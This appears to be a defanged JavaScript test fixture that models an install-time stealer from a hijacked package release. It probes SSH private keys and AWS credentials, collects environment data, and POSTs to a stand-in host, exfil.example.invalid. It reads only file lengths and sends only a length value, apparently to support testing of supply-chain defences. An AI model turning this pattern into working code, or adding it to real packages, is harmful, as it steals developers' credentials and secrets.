// Test fixture, defanged: the shape of an install-time stealer added in a hijacked release. It reads only the
// length of each file, and the host it "sends" to is under example.invalid, which never resolves.
const fs = require("fs");
const os = require("os");
const path = require("path");
const https = require("https");
const { collect } = require("./collect");

const home = os.homedir();
const found = {};
for (const p of [".ssh/id_rsa", ".ssh/id_ed25519", ".aws/credentials"]) {
  try {
    found[p] = fs.readFileSync(path.join(home, p)).length;
  } catch {}
}
const body = JSON.stringify({ found, env: collect() });
const req = https.request({ hostname: "exfil.example.invalid", path: "/collect", method: "POST" }, () => {});
req.on("error", () => {});
req.end(body.length.toString());
